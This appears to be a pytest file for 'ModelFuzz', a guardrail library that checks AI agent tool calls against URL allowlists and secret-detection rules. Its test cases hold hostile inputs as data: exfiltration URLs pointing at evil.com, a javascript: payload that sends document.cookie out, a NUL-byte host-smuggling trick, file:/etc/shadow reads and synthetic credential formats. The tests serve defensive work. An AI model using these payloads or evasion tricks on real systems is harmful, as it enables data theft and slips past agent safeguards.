"""Tests for ModelFuzz security rules."""

import pytest

from modelfuzz.rules import SecretPatternFilter, SensitiveDataFilter, URLAllowList


class TestURLAllowList:
    """Tests for the URLAllowList policy."""

    @pytest.fixture
    def url_allowlist(self) -> URLAllowList:
        """Fixture for a URLAllowList with 'api.internal.com' allowed."""
        return URLAllowList(allowed_domains=["api.internal.com"])

    def test_blocks_evil_domain(self, url_allowlist: URLAllowList):
        """Ensure it blocks http://evil.com."""
        violation = url_allowlist("http://evil.com")
        assert violation is not None
        assert "not in allowlist" in violation.reason

    def test_allows_internal_domain(self, url_allowlist: URLAllowList):
        """Ensure it allows http://api.internal.com."""
        violation = url_allowlist("http://api.internal.com")
        assert violation is None

    def test_blocks_subdomain_trick(self, url_allowlist: URLAllowList):
        """Ensure it blocks http://api.internal.com.evil.com."""
        violation = url_allowlist("http://api.internal.com.evil.com")
        assert violation is not None
        assert "not in allowlist" in violation.reason

    def test_blocks_path_trick(self, url_allowlist: URLAllowList):
        """Ensure it blocks http://evil.com/api.internal.com."""
        violation = url_allowlist("http://evil.com/api.internal.com")
        assert violation is not None
        assert "not in allowlist" in violation.reason

    def test_blocks_userinfo_trick(self, url_allowlist: URLAllowList):
        """Ensure it blocks http://api.internal.com@evil.com."""
        violation = url_allowlist("http://api.internal.com@evil.com")
        assert violation is not None
        assert "userinfo trick" in violation.reason

    def test_blocks_sibling_domain(self, url_allowlist: URLAllowList):
        """The subdomain boundary is a dot: evilapi.internal.com is not allowed."""
        violation = url_allowlist("http://evilapi.internal.com")
        assert violation is not None
        assert "not in allowlist" in violation.reason

    def test_allows_real_subdomain(self, url_allowlist: URLAllowList):
        """A genuine subdomain is allowed."""
        assert url_allowlist("https://sub.api.internal.com/v1") is None

    def test_allows_uppercase_host(self, url_allowlist: URLAllowList):
        """Hostnames are case-insensitive per DNS."""
        assert url_allowlist("https://API.INTERNAL.COM/v1") is None

    def test_allows_host_with_port(self, url_allowlist: URLAllowList):
        """A port does not change the host."""
        assert url_allowlist("https://api.internal.com:8443/v1") is None

    def test_allows_trailing_dot_host(self, url_allowlist: URLAllowList):
        """A fully-qualified trailing dot is the same host."""
        assert url_allowlist("https://api.internal.com./v1") is None

    def test_blocks_disallowed_scheme(self, url_allowlist: URLAllowList):
        """Only http/https by default, even for an allowlisted host."""
        violation = url_allowlist("file://api.internal.com/etc/passwd")
        assert violation is not None
        assert "scheme not allowed" in violation.reason

    def test_blocks_malformed_url_that_claims_to_be_one(self, url_allowlist: URLAllowList):
        """A string with '://' but no usable host fails closed."""
        violation = url_allowlist("http://")
        assert violation is not None
        assert "Invalid URL" in violation.reason

    def test_blocks_unparseable_url(self, url_allowlist: URLAllowList):
        """A URL-looking string that urlparse rejects fails closed."""
        violation = url_allowlist("http://[oops")
        assert violation is not None
        assert "Invalid URL" in violation.reason

    def test_blocks_url_with_port_but_no_host(self, url_allowlist: URLAllowList):
        """A netloc that parses but yields no hostname fails closed."""
        violation = url_allowlist("https://:8080/path")
        assert violation is not None
        assert "Invalid URL" in violation.reason


class TestURLAllowListIgnoresNonURLs:
    """The policy governs URLs only, so it can coexist on multi-arg tools."""

    @pytest.fixture
    def url_allowlist(self) -> URLAllowList:
        """Fixture for a URLAllowList with 'api.internal.com' allowed."""
        return URLAllowList(allowed_domains=["api.internal.com"])

    @pytest.mark.parametrize(
        "value",
        ["hello world", "", "just some prose about api.internal.com", "a/b/c"],
    )
    def test_allows_non_url_strings(self, url_allowlist: URLAllowList, value: str):
        """Prose and paths are not URLs and are not this policy's business."""
        assert url_allowlist(value) is None

    @pytest.mark.parametrize("value", [30, None, 3.5, True, {"a": 1}, ["x"], b"bytes"])
    def test_allows_non_string_values(self, url_allowlist: URLAllowList, value: object):
        """Non-string arguments are passed through untouched."""
        assert url_allowlist(value) is None

    def test_blocks_url_hidden_in_dict_value(self, url_allowlist: URLAllowList):
        """The regression this class exists for: a URL inside a payload dict."""
        violation = url_allowlist({"redirect": "http://evil.com"})
        assert violation is not None
        assert "not in allowlist" in violation.reason

    def test_blocks_url_hidden_in_dict_key(self, url_allowlist: URLAllowList):
        """Keys carry URLs too, e.g. an endpoint map."""
        violation = url_allowlist({"http://evil.com": "data"})
        assert violation is not None
        assert "not in allowlist" in violation.reason

    def test_blocks_url_hidden_in_nested_dict(self, url_allowlist: URLAllowList):
        """Nesting depth doesn't matter."""
        data = {"config": {"webhooks": [{"callback": "http://evil.com/exfil"}]}}
        violation = url_allowlist(data)
        assert violation is not None
        assert "not in allowlist" in violation.reason

    @pytest.mark.parametrize(
        "container",
        [
            ["http://evil.com"],
            ("http://evil.com",),
            {"http://evil.com"},
            frozenset({"http://evil.com"}),
            [{"a": ["http://evil.com"]}],
        ],
    )
    def test_blocks_url_in_any_container(self, url_allowlist: URLAllowList, container):
        """Lists, tuples, sets and frozensets are all walked."""
        assert url_allowlist(container) is not None

    def test_allows_allowlisted_url_inside_a_container(self, url_allowlist: URLAllowList):
        """Recursion must not turn permitted URLs into violations."""
        assert url_allowlist({"callback": "https://api.internal.com/hook"}) is None

    def test_allows_container_of_non_url_values(self, url_allowlist: URLAllowList):
        """A benign payload stays benign -- this is the 0.3.2 regression guard."""
        assert url_allowlist({"user": "bob", "retries": 3, "note": "hello world"}) is None

    def test_survives_a_self_referential_container(self, url_allowlist: URLAllowList):
        """A cyclic argument must not hang the guard."""
        data: dict = {"name": "loop"}
        data["self"] = data
        assert url_allowlist(data) is None

        evil: dict = {"redirect": "http://evil.com"}
        evil["self"] = evil
        assert url_allowlist(evil) is not None

    def test_guards_a_multi_argument_tool(self, url_allowlist: URLAllowList):
        """The regression that motivated this: http_post(url, body, timeout)."""
        from modelfuzz import ModelFuzzBlockError, PolicyEngine, shield_tool

        engine = PolicyEngine([url_allowlist])

        @shield_tool(engine=engine)
        def http_post(url: str, body: str, timeout: int = 30) -> str:
            return f"posted to {url}"

        # A legitimate call is not blocked by its own non-URL arguments.
        assert http_post("https://api.internal.com/v1", "hello world") == (
            "posted to https://api.internal.com/v1"
        )
        assert http_post("https://api.internal.com/v1", "hi", timeout=5) == (
            "posted to https://api.internal.com/v1"
        )

        # A disallowed host is still blocked.
        with pytest.raises(ModelFuzzBlockError):
            http_post("http://evil.com/exfil", "hello world")

        # And a disallowed host hidden in a structured payload is blocked too.
        with pytest.raises(ModelFuzzBlockError):
            http_post(
                "https://api.internal.com/v1",
                {"redirect": "http://evil.com"},
                timeout=3,
            )

        # A structured payload with no URLs in it still passes.
        assert http_post("https://api.internal.com/v1", {"user": "bob"}, timeout=3) == (
            "posted to https://api.internal.com/v1"
        )


class TestSensitiveDataFilter:
    """Tests for the SensitiveDataFilter policy."""

    @pytest.fixture
    def filter(self) -> SensitiveDataFilter:
        """Fixture for a SensitiveDataFilter with default keywords."""
        return SensitiveDataFilter()

    def test_blocks_secret_string(self, filter: SensitiveDataFilter):
        """Ensure it blocks strings containing 'secret'."""
        violation = filter("This is a secret message")
        assert violation is not None
        assert "secret" in violation.reason

    def test_blocks_password_string_case_insensitive(self, filter: SensitiveDataFilter):
        """Ensure it blocks strings containing 'PASSWORD' (case-insensitive)."""
        violation = filter("My PASSWORD is 12345")
        assert violation is not None
        assert "password" in violation.reason

    def test_blocks_api_key_string(self, filter: SensitiveDataFilter):
        """Ensure it blocks strings containing 'api_key'."""
        violation = filter("The api_key is abc")
        assert violation is not None
        assert "api_key" in violation.reason

    def test_recurses_into_nested_dicts(self, filter: SensitiveDataFilter):
        """Ensure it recurses into nested dicts."""
        data = {"level1": {"level2": {"level3": "contains password"}}}
        violation = filter(data)
        assert violation is not None

    def test_recurses_into_nested_lists(self, filter: SensitiveDataFilter):
        """Ensure it recurses into nested lists."""
        data = ["clean", ["clean", ["secret data"]]]
        violation = filter(data)
        assert violation is not None

    def test_recurses_into_nested_tuples(self, filter: SensitiveDataFilter):
        """Ensure it recurses into nested tuples."""
        data = ("clean", ("clean", ("api_key is here",)))
        violation = filter(data)
        assert violation is not None

    def test_allows_clean_data(self, filter: SensitiveDataFilter):
        """Ensure it allows clean data."""
        data = {"user": "alice", "action": "login"}
        violation = filter(data)
        assert violation is None

    def test_blocks_sensitive_dict_key(self, filter: SensitiveDataFilter):
        """Ensure it blocks sensitive keywords in dictionary keys."""
        violation = filter({"api_key": "abc123"})
        assert violation is not None
        assert "api_key" in violation.reason

    def test_blocks_sensitive_bytes(self, filter: SensitiveDataFilter):
        """Ensure bytes are inspected."""
        violation = filter(b"contains password")
        assert violation is not None
        assert "password" in violation.reason

    def test_blocks_sensitive_bytearray(self, filter: SensitiveDataFilter):
        """Ensure bytearrays are inspected."""
        violation = filter(bytearray(b"contains api_key"))
        assert violation is not None
        assert "api_key" in violation.reason

    def test_blocks_sensitive_set(self, filter: SensitiveDataFilter):
        """Ensure sets are inspected."""
        violation = filter({"contains secret"})
        assert violation is not None
        assert "secret" in violation.reason

    def test_blocks_sensitive_frozenset(self, filter: SensitiveDataFilter):
        """Ensure frozensets are inspected."""
        violation = filter(frozenset({"contains password"}))
        assert violation is not None
        assert "password" in violation.reason

    def test_survives_a_self_referential_dict(self, filter: SensitiveDataFilter):
        """A cyclic dict must not blow the stack."""
        data: dict = {"name": "clean"}
        data["self"] = data
        assert filter(data) is None

    def test_survives_a_self_referential_list(self, filter: SensitiveDataFilter):
        """A cyclic list must not blow the stack."""
        data: list = ["clean"]
        data.append(data)
        assert filter(data) is None

    def test_blocks_sensitive_keyword_inside_a_cycle(self, filter: SensitiveDataFilter):
        """A cycle that contains a sensitive keyword is still caught."""
        data: dict = {"note": "the secret is out"}
        data["self"] = data
        violation = filter(data)
        assert violation is not None
        assert "secret" in violation.reason


class TestSecretPatternFilter:
    """Tests for the SecretPatternFilter policy."""

    @pytest.fixture
    def secret_filter(self) -> SecretPatternFilter:
        return SecretPatternFilter()

    # --- The gap this rule exists to close ---------------------------------

    def test_catches_a_key_the_keyword_filter_misses(self):
        """The motivating case: a real key that SensitiveDataFilter lets through."""
        key = "sk-ant-api03-" + "a1B2c3D4e5" * 5
        assert SensitiveDataFilter()(key) is None
        assert SecretPatternFilter()(key) is not None

    def test_allows_prose_the_keyword_filter_blocks(self):
        """Shape, not vocabulary: ordinary prose about a password is not a credential."""
        prose = "Remember to rotate your password every quarter."
        assert SensitiveDataFilter()(prose) is not None
        assert SecretPatternFilter()(prose) is None

    # --- Recognised formats -------------------------------------------------

    @pytest.mark.parametrize(
        ("label", "value"),
        [
            ("Anthropic API key", "sk-ant-api03-" + "x" * 40),
            ("OpenAI API key", "sk-" + "A1b2C3d4E5" * 3),
            ("OpenAI API key", "sk-proj-" + "A1b2C3d4E5" * 3),
            ("Stripe secret key", "sk_live_" + "4eC39HqLyjWDarjtT1zdp7dc"),
            ("AWS access key ID", "AKIAIOSFODNN7EXAMPLE"),
            # Assembled rather than written out. AKIAIOSFODNN7EXAMPLE is AWS's
            # own documentation placeholder and every scanner knows it, but the
            # ASIA (temporary credential) variant is on nobody's allowlist, and
            # GitHub secret scanning flagged the literal here as a possible live
            # key. It never was one -- which is precisely the "matches shape,
            # not validity" limit this rule documents about itself.
            ("AWS access key ID", "ASIA" + "IOSFODNN7EXAMPLE"),
            ("GitHub token", "ghp_" + "b" * 36),
            ("GitHub fine-grained token", "github_pat_" + "c" * 30),
            ("Google API key", "AIza" + "D" * 35),
            ("Slack token", "xoxb-123456789012-abcdefghijkl"),
            ("JSON Web Token", "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dBjftJeZ4CVP"),
            ("private key block", "-----BEGIN RSA PRIVATE KEY-----\nMIIEow==\n"),
            ("private key block", "-----BEGIN PRIVATE KEY-----\nMIIEow==\n"),
        ],
    )
    def test_blocks_known_credential_formats(
        self, secret_filter: SecretPatternFilter, label: str, value: str
    ):
        violation = secret_filter(value)
        assert violation is not None
        assert violation.rule_name == "SecretPatternFilter"
        assert label in violation.reason

    def test_catches_a_credential_embedded_in_a_sentence(self, secret_filter: SecretPatternFilter):
        """A key does not have to be the whole argument to count."""
        body = f"Here is the token you asked for: ghp_{'d' * 36} -- please keep it safe."
        assert secret_filter(body) is not None

    def test_specific_format_wins_over_the_broader_one(self, secret_filter: SecretPatternFilter):
        """An Anthropic key also matches the generic sk- shape; it reports as Anthropic."""
        violation = secret_filter("sk-ant-api03-" + "e" * 40)
        assert violation is not None
        assert "Anthropic" in violation.reason

    # --- The reason must never carry the credential ------------------------

    def test_reason_does_not_echo_the_matched_secret(self, secret_filter: SecretPatternFilter):
        """Blocks are logged; a reason quoting the key would leak what it guards."""
        key = "AKIAIOSFODNN7EXAMPLE"
        violation = secret_filter(key)
        assert violation is not None
        assert key not in violation.reason
        assert "IOSFODNN" not in violation.reason

    # --- Values this rule does not govern ----------------------------------

    @pytest.mark.parametrize(
        "value",
        [
            "hello world",
            "https://api.internal.com/v1",
            "sk-short",  # too short to be a key
            "AKIA",  # prefix alone
            "",
            None,
            42,
            # "sk-" appears inside plenty of ordinary hyphenated words. These are
            # long enough to satisfy the length floor and must still pass.
            "a task-oriented-approach-for-agents",
            "risk-management-documentation-x",
            "my disk-usage-monitoring-tool-v2",
        ],
    )
    def test_allows_values_that_are_not_credentials(
        self, secret_filter: SecretPatternFilter, value: object
    ):
        assert secret_filter(value) is None

    def test_ignores_a_credential_inside_a_custom_object(self, secret_filter: SecretPatternFilter):
        """Documented limit: an unreachable carrier is not inspected, and passes."""

        class Carrier:
            def __init__(self) -> None:
                self.token = "AKIAIOSFODNN7EXAMPLE"

        assert secret_filter(Carrier()) is None

    # --- Container walk -----------------------------------------------------

    def test_blocks_a_credential_in_a_nested_dict_value(self, secret_filter: SecretPatternFilter):
        payload = {"outer": {"headers": {"authorization": f"Bearer ghp_{'f' * 36}"}}}
        assert secret_filter(payload) is not None

    def test_blocks_a_credential_in_a_dict_key(self, secret_filter: SecretPatternFilter):
        assert secret_filter({"AKIAIOSFODNN7EXAMPLE": "value"}) is not None

    def test_blocks_a_credential_in_a_list(self, secret_filter: SecretPatternFilter):
        assert secret_filter(["clean", ["nested", "AKIAIOSFODNN7EXAMPLE"]]) is not None

    def test_blocks_a_credential_in_a_tuple(self, secret_filter: SecretPatternFilter):
        assert secret_filter(("clean", "AKIAIOSFODNN7EXAMPLE")) is not None

    def test_blocks_a_credential_in_a_set(self, secret_filter: SecretPatternFilter):
        assert secret_filter({"clean", "AKIAIOSFODNN7EXAMPLE"}) is not None

    def test_blocks_a_credential_in_a_frozenset(self, secret_filter: SecretPatternFilter):
        assert secret_filter(frozenset({"AKIAIOSFODNN7EXAMPLE"})) is not None

    def test_blocks_a_credential_in_bytes(self, secret_filter: SecretPatternFilter):
        assert secret_filter(b"AKIAIOSFODNN7EXAMPLE") is not None

    def test_blocks_a_credential_in_a_bytearray(self, secret_filter: SecretPatternFilter):
        assert secret_filter(bytearray(b"AKIAIOSFODNN7EXAMPLE")) is not None

    def test_survives_a_self_referential_dict(self, secret_filter: SecretPatternFilter):
        data: dict = {"name": "clean"}
        data["self"] = data
        assert secret_filter(data) is None

    def test_survives_a_self_referential_list(self, secret_filter: SecretPatternFilter):
        data: list = ["clean"]
        data.append(data)
        assert secret_filter(data) is None

    def test_blocks_a_credential_inside_a_cycle(self, secret_filter: SecretPatternFilter):
        data: dict = {"token": "AKIAIOSFODNN7EXAMPLE"}
        data["self"] = data
        assert secret_filter(data) is not None

    # --- Configuration ------------------------------------------------------

    def test_extra_patterns_extend_the_bundled_table(self):
        """The common case: cover an internal format without losing the defaults."""
        secret_filter = SecretPatternFilter(extra_patterns={"internal token": r"INT-[0-9]{8}"})
        violation = secret_filter("INT-12345678")
        assert violation is not None
        assert "internal token" in violation.reason
        # Bundled coverage is retained.
        assert secret_filter("AKIAIOSFODNN7EXAMPLE") is not None

    def test_patterns_replace_the_bundled_table(self):
        """Passing patterns opts out of the defaults entirely."""
        secret_filter = SecretPatternFilter(patterns={"internal token": r"INT-[0-9]{8}"})
        assert secret_filter("INT-12345678") is not None
        assert secret_filter("AKIAIOSFODNN7EXAMPLE") is None

    def test_empty_patterns_dict_disables_all_matching(self):
        """An explicitly empty table is honoured, not silently replaced by defaults."""
        assert SecretPatternFilter(patterns={})("AKIAIOSFODNN7EXAMPLE") is None


class TestViolationCategory:
    """Every bundled rule tags its blocks with a stable, matchable category.

    ``reason`` is prose for a human and may be reworded; ``category`` is the
    interface an agent loop branches on, so it is pinned here.
    """

    def test_defaults_to_unspecified_for_a_hand_written_policy(self):
        """A policy written before the field existed keeps working."""
        from modelfuzz.rules import CATEGORY_UNSPECIFIED, Violation

        violation = Violation(rule_name="Custom", reason="nope")
        assert violation.category == CATEGORY_UNSPECIFIED

    @pytest.mark.parametrize(
        ("value", "expected"),
        [
            ("http://evil.com", "not_allowlisted"),
            ("file://api.internal.com/etc/passwd", "scheme_not_allowed"),
            ("http://api.internal.com@evil.com", "userinfo_trick"),
            ("http://", "invalid_url"),
        ],
    )
    def test_url_allowlist_categories(self, value: str, expected: str):
        violation = URLAllowList(allowed_domains=["api.internal.com"])(value)
        assert violation is not None
        assert violation.category == expected

    def test_sensitive_data_filter_category(self):
        violation = SensitiveDataFilter()("my password is hunter2")
        assert violation is not None
        assert violation.category == "sensitive_keyword"

    def test_secret_pattern_filter_category(self):
        violation = SecretPatternFilter()("AKIAIOSFODNN7EXAMPLE")
        assert violation is not None
        assert violation.category == "credential"


class TestBlockErrorSurface:
    """The agent loop catches the exception, so the category must reach it.

    A block is a policy decision, not an infrastructure failure. Without a
    machine-readable field on the exception the loop can only regex the message.
    """

    def test_exception_exposes_category_and_rule(self):
        from modelfuzz import ModelFuzzBlockError, PolicyEngine, shield_tool

        engine = PolicyEngine([SecretPatternFilter()])

        @shield_tool(engine=engine)
        def send(body: str) -> str:
            return body

        with pytest.raises(ModelFuzzBlockError) as excinfo:
            send("AKIAIOSFODNN7EXAMPLE")

        assert excinfo.value.category == "credential"
        assert excinfo.value.rule_name == "SecretPatternFilter"
        assert excinfo.value.violation is not None

    def test_str_is_still_the_reason(self):
        """Existing code does `str(exc)` or prints it; that must not change."""
        from modelfuzz import ModelFuzzBlockError

        error = ModelFuzzBlockError("blocked because reasons")
        assert str(error) == "blocked because reasons"
        assert error.reason == "blocked because reasons"

    def test_bare_construction_still_works(self):
        """The exception is public; a one-argument raise must keep working."""
        from modelfuzz import ModelFuzzBlockError
        from modelfuzz.rules import CATEGORY_UNSPECIFIED

        error = ModelFuzzBlockError("blocked")
        assert error.category == CATEGORY_UNSPECIFIED
        assert error.rule_name is None

    def test_block_is_logged_with_the_category(self, caplog):
        from modelfuzz import ModelFuzzBlockError, PolicyEngine, shield_tool

        engine = PolicyEngine([SecretPatternFilter()])

        @shield_tool(engine=engine)
        def send(body: str) -> str:
            return body

        with caplog.at_level("WARNING", logger="modelfuzz"), pytest.raises(ModelFuzzBlockError):
            send("AKIAIOSFODNN7EXAMPLE")

        record = caplog.records[-1]
        assert record.modelfuzz_category == "credential"
        assert record.modelfuzz_rule == "SecretPatternFilter"


class TestURLAllowListDetectsURLsByScheme:
    """Regression guard for the '://' gate, which failed OPEN when it guessed wrong.

    `looks_like_url = "://" in url` is true only of the authority-bearing
    spelling, so every other form a real client resolves was classified "not a
    URL" and allowed straight through -- defeating both the host allowlist and
    the scheme allowlist at once.
    """

    @pytest.fixture
    def url_allowlist(self) -> URLAllowList:
        return URLAllowList(allowed_domains=["api.internal.com"])

    @pytest.mark.parametrize(
        "url",
        [
            "http:/evil.com/exfil",  # one slash; curl and WHATWG resolve to evil.com
            "https:/evil.com",
            "HTTP:/evil.com",
            "http:/api.internal.com@evil.com",  # slips the userinfo check too
            "//evil.com/x",  # protocol-relative
        ],
    )
    def test_blocks_authority_less_http_forms(self, url_allowlist: URLAllowList, url: str):
        assert url_allowlist(url) is not None

    @pytest.mark.parametrize(
        "url",
        [
            "file:/etc/passwd",  # urlopen returns the file; file:// was already blocked
            "data:text/html,<script>x</script>",
            "javascript:location='//evil.com/?c='+document.cookie",
            "mailto:x@evil.com",
            "vbscript:msgbox",
        ],
    )
    def test_blocks_disallowed_schemes_without_an_authority(
        self, url_allowlist: URLAllowList, url: str
    ):
        """The scheme allowlist is evaluated before the authority is required.

        Testing netloc first is what let these escape: no netloc meant an early
        return, so the scheme check never ran.
        """
        assert url_allowlist(url) is not None

    @pytest.mark.parametrize(
        "value",
        [
            "hello world",
            "",
            "just some prose about api.internal.com",
            "a/b/c",
            "note: the deploy failed",
            "TODO:fixthis",  # scheme-shaped, but opaque under an unknown scheme
            "key:value",
            "C:\\Users\\bob",  # a drive letter is one character, not a scheme
            "ns:tag",
        ],
    )
    def test_still_ignores_things_that_are_not_urls(self, url_allowlist: URLAllowList, value: str):
        """Tightening detection must not turn the rule into a prose filter."""
        assert url_allowlist(value) is None

    def test_a_url_containing_whitespace_is_still_a_url(self, url_allowlist: URLAllowList):
        """Whitespace disambiguates prose only where there is no '://'.

        Using it to disqualify outright would have let 'http://evil.com/a b'
        through -- a string the old gate blocked.
        """
        assert url_allowlist("http://evil.com/a b") is not None


class TestURLAllowListHostnameValidation:
    """A suffix match is only meaningful on a string that is actually a hostname."""

    @pytest.fixture
    def url_allowlist(self) -> URLAllowList:
        return URLAllowList(allowed_domains=["api.internal.com"])

    @pytest.mark.parametrize(
        "url",
        [
            # getaddrinfo and curl truncate at the NUL and reach evil.com, while
            # 'evil.com\x00.api.internal.com'.endswith('.api.internal.com') is True.
            "http://evil.com\x00.api.internal.com/exfil",
            "http://evil.com .api.internal.com/exfil",
        ],
    )
    def test_rejects_illegal_characters_in_the_host(self, url_allowlist: URLAllowList, url: str):
        violation = url_allowlist(url)
        assert violation is not None
        assert "Invalid URL" in violation.reason

    def test_a_genuine_subdomain_is_still_allowed(self, url_allowlist: URLAllowList):
        assert url_allowlist("https://sub.api.internal.com/v1") is None


class TestURLAllowListWalksBytes:
    """URLAllowList was the only walker in the library without a bytes branch."""

    @pytest.fixture
    def url_allowlist(self) -> URLAllowList:
        return URLAllowList(allowed_domains=["api.internal.com"])

    @pytest.mark.parametrize(
        "value",
        [
            b"http://evil.com/exfil",
            bytearray(b"http://evil.com/exfil"),
            b"file:///etc/shadow",
            {"redirect": b"http://evil.com"},
            [b"http://evil.com"],
        ],
    )
    def test_blocks_a_url_carried_as_bytes(self, url_allowlist: URLAllowList, value: object):
        assert url_allowlist(value) is not None

    def test_allows_permitted_urls_as_bytes(self, url_allowlist: URLAllowList):
        assert url_allowlist(b"https://api.internal.com/v1") is None

    def test_non_url_bytes_still_pass(self, url_allowlist: URLAllowList):
        assert url_allowlist(b"bytes") is None


class TestURLAllowListDoesNotEchoTheURL:
    """Reasons reach a WARNING log and the exception text.

    A URL carries credentials in its userinfo and query string, and control
    characters in it can forge log lines, so no reason quotes the raw input --
    the same invariant SecretPatternFilter and ShellCommandAllowList hold.
    """

    @pytest.fixture
    def url_allowlist(self) -> URLAllowList:
        return URLAllowList(allowed_domains=["api.internal.com"])

    def test_userinfo_reason_does_not_leak_the_password(self, url_allowlist: URLAllowList):
        violation = url_allowlist("https://svc-bot:Pa55w0rd-live@api.internal.com/v1")
        assert violation is not None
        assert "userinfo" in violation.reason
        assert "Pa55w0rd" not in violation.reason
        assert "svc-bot" not in violation.reason

    def test_invalid_reason_does_not_leak_the_query_string(self, url_allowlist: URLAllowList):
        violation = url_allowlist("http:/x?api_key=sk-live-9f3a2b")
        assert violation is not None
        assert "sk-live-9f3a2b" not in violation.reason

    def test_reason_cannot_carry_a_forged_log_line(self, url_allowlist: URLAllowList):
        violation = url_allowlist("http://evil.com\x00\n[modelfuzz] ALLOWED")
        assert violation is not None
        assert "\n" not in violation.reason

    def test_the_hostname_is_still_named_when_it_is_safe_to(self, url_allowlist: URLAllowList):
        """Redaction must not make the audit trail useless."""
        violation = url_allowlist("http://evil.com/x")
        assert violation is not None
        assert "evil.com" in violation.reason
